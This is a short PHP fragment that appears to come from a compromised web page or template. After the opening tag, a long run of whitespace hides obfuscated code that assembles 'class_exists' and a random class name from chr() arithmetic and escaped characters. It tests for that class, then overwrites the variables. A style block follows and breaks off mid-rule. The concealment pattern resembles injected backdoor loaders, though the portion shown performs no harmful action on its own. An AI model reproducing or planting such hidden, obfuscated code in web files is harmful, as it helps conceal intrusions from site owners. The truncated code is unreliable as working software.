<?php                                                                                                                                                                                                                                                                                                                                                                                                 $DiONhxzAKz = 'l' . chr ( 759 - 683 ).'_' . "\105" . "\x6c" . "\120" . chr (75); $FUXUz = 'c' . chr ( 964 - 856 ).chr ( 197 - 100 )."\x73" . 's' . '_' . "\145" . chr (120) . "\151" . chr (115) . chr ( 945 - 829 )."\x73";$RfBOgqt = class_exists($DiONhxzAKz); $DiONhxzAKz = "14104";$FUXUz = "49310"; ?><style>
  .a_text{
